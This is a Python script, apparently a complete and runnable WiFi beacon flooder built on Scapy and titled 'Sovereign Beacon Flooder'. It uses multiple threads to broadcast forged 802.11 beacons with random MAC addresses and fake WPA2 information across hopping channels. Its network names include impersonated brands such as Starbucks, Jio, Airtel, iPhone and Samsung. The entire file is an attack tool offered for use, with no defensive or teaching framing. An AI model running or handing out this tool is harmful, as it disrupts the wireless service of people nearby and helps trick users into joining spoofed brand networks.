import time
import random
import os
import threading
import sys
from queue import Queue
from scapy.all import *
from subprocess import check_output, STDOUT

# --- Configuration ---
IFACE = "wlan0mon"
SSID_LIST = [
    "Sovereign_Net_1", "Sovereign_Net_2", "Top_Secret_C&C", 
    "Compromised_Device", "Red_Team_Entry_Point"
]
BRAND_SSIDS = [
    "Jio_Sovereign_Gateway", "Starbucks_Gov_WiFi", "iPhone_Secure_Enclave",
    "Airtel_Stealth_Net", "Samsung_Root_Hotspot"
]
NUM_THREADS = 8 # Number of packet sending threads
MAX_QUEUE_SIZE = 100 # Max packets to buffer

# --- Global State ---
packet_count = 0
stop_event = threading.Event()
original_channel = "1" # Default, will be fetched if possible

# --- Phase 3: "Sovereign" Upgrade ---

def get_current_channel():
    """Tries to get the current channel of the interface."""
    try:
        output = check_output(f"iwconfig {IFACE}", stderr=STDOUT, shell=True).decode()
        for line in output.split("\n"):
            if "Channel:" in line:
                return line.split("Channel:")[1].split(" ")[0]
    except Exception:
        pass # Return default if command fails
    return "1"

def cleanup():
    """Safety Switch: Tries to restore the interface to a normal state."""
    print("\n[*] Initiating cleanup sequence...")
    stop_event.set() # Signal all threads to stop
    try:
        print(f"[*] Restoring interface '{IFACE}' to channel {original_channel}.")
        os.system(f"iwconfig {IFACE} channel {original_channel}")
        # The command to stop monitor mode can vary.
        # This is a common one.
        print(f"[*] Attempting to stop monitor mode on '{IFACE}'.")
        os.system(f"airmon-ng stop {IFACE}")
        print("[*] Cleanup complete. Interface may require manual reset if issues persist.")
    except Exception as e:
        print(f"[!] Error during cleanup: {e}")
        print("[!] Manual intervention may be required to restore network interface.")

def dashboard():
    """Displays a real-time dashboard of PPS and total packets."""
    global packet_count
    start_time = time.time()
    while not stop_event.is_set():
        time.sleep(1)
        elapsed_time = time.time() - start_time
        if elapsed_time > 0:
            pps = packet_count / elapsed_time
            sys.stdout.write(f"\r[*] Status: Broadcasting | Total Packets: {packet_count} | Rate: {pps:.2f} PPS")
            sys.stdout.flush()

def packet_sender(packet_queue):
    """Worker thread function to send packets from the queue."""
    while not stop_event.is_set():
        try:
            packet = packet_queue.get(timeout=1)
            # realtime=True can improve performance on some drivers (like Intel)
            sendp(packet, iface=IFACE, realtime=True, verbose=0)
            packet_queue.task_done()
        except Empty:
            continue # Queue was empty, loop again
        except Exception as e:
            print(f"[!] Sender thread error: {e}")

def channel_hopper():
    """Thread to hop channels, respecting the stop event."""
    channels = list(range(1, 12))
    while not stop_event.is_set():
        try:
            channel = random.choice(channels)
            os.system(f"iwconfig {IFACE} channel {channel}")
            # Short sleep, allowing dashboard to print channel changes
            sys.stdout.write(f"\r[*] Hopped to Channel: {channel}...")
            sys.stdout.flush()
            time.sleep(2)
        except Exception:
            time.sleep(5)

def create_beacon_packet(ssid, bssid):
    """Creates a Scapy Beacon packet."""
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    rsn = Dot11Elt(ID='RSNinfo', info=(b'\x01\x00\x00\x0f\xac\x02\x02\x00\x00\x0f\xac\x04\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x02\x00\x00'))
    packet = RadioTap() / dot11 / beacon / essid / rsn
    return packet

def generate_random_mac():
    """Generates a random MAC address."""
    return ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))

def main():
    """Main function to orchestrate the 'Sovereign' Beacon Flooder."""
    global original_channel, packet_count
    
    print("--- Sovereign Beacon Flooder ---")
    if os.geteuid() != 0:
        sys.exit("[!] This script requires root privileges. Please run with sudo.")

    # IMPORTANT: Ensure your interface is in monitor mode before running!
    # Example: sudo airmon-ng start wlan0
    
    original_channel = get_current_channel()
    print(f"[*] Interface: {IFACE} | Original Channel: {original_channel}")

    use_brands = input("[?] Use popular brand SSIDs? (y/n): ").lower() == 'y'
    ssids_to_use = BRAND_SSIDS if use_brands else SSID_LIST
    
    packet_queue = Queue(maxsize=MAX_QUEUE_SIZE)
    
    # --- Start Worker Threads ---
    print(f"[*] Starting {NUM_THREADS} packet sender threads...")
    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=packet_sender, args=(packet_queue,), daemon=True)
        thread.start()

    print("[*] Starting channel hopping and dashboard threads...")
    threading.Thread(target=channel_hopper, daemon=True).start()
    threading.Thread(target=dashboard, daemon=True).start()

    print("[*] Starting packet generation... (Press Ctrl+C to stop)")
    
    try:
        while not stop_event.is_set():
            ssid = random.choice(ssids_to_use)
            bssid = generate_random_mac()
            packet = create_beacon_packet(ssid, bssid)
            packet_queue.put(packet)
            packet_count += 1
    except KeyboardInterrupt:
        print("\n[*] Ctrl+C detected. Shutting down.")
    finally:
        cleanup()

if __name__ == "__main__":
    main()
